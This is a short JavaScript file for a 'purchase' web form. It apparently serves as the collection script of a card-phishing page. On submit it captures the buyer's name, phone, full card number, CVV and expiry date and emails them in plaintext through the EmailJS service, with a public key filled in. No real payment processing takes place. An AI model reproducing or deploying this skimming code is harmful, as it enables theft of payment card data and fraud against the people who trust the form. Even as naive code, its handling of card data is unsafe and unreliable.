// Listen for form submission
document.getElementById('purchaseForm').addEventListener('submit', function(event) {
  event.preventDefault(); // Prevent page reload

  // Get the input values
  const name = document.getElementById('name').value;
  const phone = document.getElementById('phone').value;
  const cardNumber = document.getElementById('cardNumber').value;
  const cvv = document.getElementById('cvv').value;
  const expiryDate = document.getElementById('expiryDate').value;

  // Prepare the message to send
  const message = {
    name: name,
    phone: phone,
    cardNumber: cardNumber,
    cvv: cvv,
    expiryDate: expiryDate
  };

  // Send the email using EmailJS
  emailjs.send('service_YourServiceID', 'template_YourTemplateID', message)
    .then(function(response) {
      console.log('Success:', response);
      alert('Information has been sent successfully!');
    }, function(error) {
      console.log('Error:', error);
      alert('There was an error sending the information. Please try again later.');
    });
});
emailjs.init('rhLM_yPt7BVtRniqc');